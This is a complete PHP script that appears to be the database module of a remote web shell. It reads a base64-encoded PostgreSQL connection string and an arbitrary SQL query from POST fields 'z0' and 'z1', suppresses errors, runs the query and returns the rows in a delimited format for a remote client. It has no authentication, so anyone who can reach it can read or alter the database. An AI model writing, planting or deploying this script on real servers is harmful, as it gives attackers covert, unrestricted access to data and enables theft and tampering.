<?php

@ini_set('display_errors','0');
@set_time_limit(0);

if (!extension_loaded('pgsql'))
    die('0|Module \'pgsql\' is unavailable.');

$connStr = base64_decode($_POST['z0'] ?? '');
$szQuery = base64_decode($_POST['z1'] ?? '');

$colSplitter = "|";
$rowSplitter = ";";

function parseConn($str)
{
    $out = [];
    foreach (explode(';', $str) as $part) {
        if (strpos($part, '=') !== false) {
            [$k, $v] = explode('=', $part, 2);
            $out[trim($k)] = trim($v);
        }
    }
    return $out;
}

$cfg = parseConn($connStr);

$host = $cfg['Host'] ?? $cfg['Server'] ?? 'localhost';
$db = $cfg['Database'] ?? '';
$user = $cfg['User Id'] ?? $cfg['UID'] ?? '';
$pass = $cfg['Password'] ?? $cfg['PWD'] ?? '';

$conn = pg_connect("host=$host dbname=$db user=$user password=$pass");

if (!$conn) {
    die("Connection failed");
}

// connection test only
if (trim($szQuery) == "") {
    echo "1|";
    pg_close($conn);

    exit;
}

$result = pg_query($conn, $szQuery);

if (!$result) {
    die("0|Query failed.");
}

$outputRows = [];

while ($row = pg_fetch_assoc($result)) {
    $outputRows[] = implode($colSplitter, $row);
}

echo implode($rowSplitter, $outputRows);

pg_close($conn);

?>